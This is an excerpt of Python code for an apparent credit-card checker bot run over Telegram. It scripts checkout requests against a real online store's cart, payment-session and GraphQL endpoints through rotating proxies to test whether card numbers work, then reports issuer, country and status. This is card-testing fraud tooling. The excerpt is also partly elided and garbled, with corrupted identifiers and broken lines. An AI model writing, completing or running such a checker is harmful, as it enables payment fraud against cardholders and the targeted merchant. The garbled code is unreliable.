...
ShResult = namedtuple('ShResult', ['message', 'elapsed_time', 'proxy_status', 'status', 'card_info', 'issuer', 'country', 'currency', 'response'])
...
async def sh(card_input: str):
    ...
    async with aiohttp.ClientSession(connector=connector) as r:
        ...
        try:
            async with r.post(url, headers=headers, data=data, timeout=30) as response:
                ...
                if response.status != 200:
                    ...
                    return ShResult("Initial request failed", time.time()-start_time, proxy_status, "Error", f"{type} - {level} - {brand}", bank, country, currency, "")
                log_event("INFO", "Initial POST success", None)
        except asyncio.TimeoutError:
            proxy_manager.mark_bad(proxy)
            proxy_status = "Dead"
            log_event("ERROR", "Initial POST timed out", None)
            return ShResult("Initial request timed out", time.time()-start_time, proxy_status, "Error", f"{type} - {level} - {brand}", bank, country, currency, "")
        except Exception as e:
        ...
        try:
            async with r.get('https://www.healthyfocus.com.au/cart.js', headers=headers, timeout=30) as response:
                ...
                try:
                    ...
                    return ShResult("Cart data error", time.time()-start_time, proxy_status, "Error", f"{type} - {level} - {brand}", bank, country, currency, "")
        except asyncio.TimeoutError:
            proxy_manager.mark_bad(proxy)
            proxy_status = "Dead"
            log_event("ERROR", "Cart request timed out", None)
            return ShResult("Cart request timed out", time.time()-start_time, proxy_status, "Error", f"{type} - {level} - {brand}", bank, country, currency, "")
        except Exception as e:
        ...
        try:
            ...
            return ShResult("Token extraction timed out", time.time()-start_time, proxy_status, "Error", f"{type} - {level} - {brand}", bank, country, currency, "")
        except Exception as e:
            log_event("ERROR", f"Token extraction failed: {str(e)}", None)
            return ShResult("Token extraction failed", time.time()-start_time, proxy_status, "Error", f"{type} - {level} - {brand}", bank, country, currency, "")
        ...
        try:
            async with r.post('https://healthyfocus.com.au/sessions', headers=headers, json=json_data, timeout=30) as response:
                try:
                    ...
                    return ShResult("Payment session failed", time.time()-start_time, proxy_status, "Error", f"{type} - {level} - {brand}", bank, country, currency, "")
        except asyncio.TimeoutError:
            proxy_manager.mark极ad(proxy)
            proxy_status = "Dead"
            log_event("ERROR", "Payment session timed out", None)
            return ShResult("Payment session timed out", time.time()-start_time, proxy_status, "Error", f"{type} - {level} - {brand}", bank, country, currency, "")
        except Exception as e:
        ...
        try:
            async with r.post(
                ...
                try:
                    ...
                    return ShResult("GraphQL decode error", time.time()-start_time, proxy_status, "Error", f"{type} - {level} - {brand}", bank, country, currency, "")
                except KeyError:
                    log_event("ERROR", "GraphQL response missing receipt ID", None)
                    return ShResult("GraphQL response error", time.time()-start_time, proxy_status, "Error", f"{type} - {level} - {brand}", bank, country, currency, "")
        except asyncio.TimeoutError:
            proxy_manager.mark_bad(proxy)
            proxy_status = "Dead"
            log_event("ERROR", "GraphQL POST timed out", None)
            return ShResult("GraphQL request timed out", time.time()-start_time, proxy_status, "Error", f"{type} - {level} - {brand}", bank, country, currency, "")
        except Exception as e:
            log_event("ERROR", f"GraphQL POST exception: {str(e)}", None)
            return ShResult("GraphQL request failed", time.time()-start_time, proxy_status, "Error", f"{type} - {level} - {brand}", bank, country, currency, "")
...
[⌬]𝗣𝗿𝗼𝘅𝘆 -» {proxy_status}""", 
            ...
            return ShResult("Final request timed out", time.time()-start_time, proxy_status, "Error", f"{type} - {level} - {brand}", bank, country, currency, "")
        except Exception as e:
            log_event("ERROR", f"Final POST exception: {str(e)}", None)
            return ShResult("Final request failed", time.time()-start_time, proxy_status, "Error", f"{type} - {level} - {brand}", bank, country, currency, "")

    return ShResult("Card processing completed", time.time()-start_time, proxy_status, "Unknown", f"{type} - {level} - {brand}", bank, country, currency, "")
...
async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ You are not authorized to use this command.")
        log_event("WARNING", "Unauthorized broadcast attempt", user极
        return
...
async def single_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    full_card = f"{card.replace(' ', '')[:4]} XXXX XXXX {card.replace(' ', '')[-4:]}"  # Masked card
    status = result.status
    response = result.response
    card_info = result.card_info
    issuer = result.issuer
    country_display = f"{result.country} - {result.currency}"
...
async def check_card_wrapper(card, context, update, results):
    try:
        ...
        return card, ShResult(f"Error: {str(e)}", 0, "Dead", "Error", "", "", "", "")
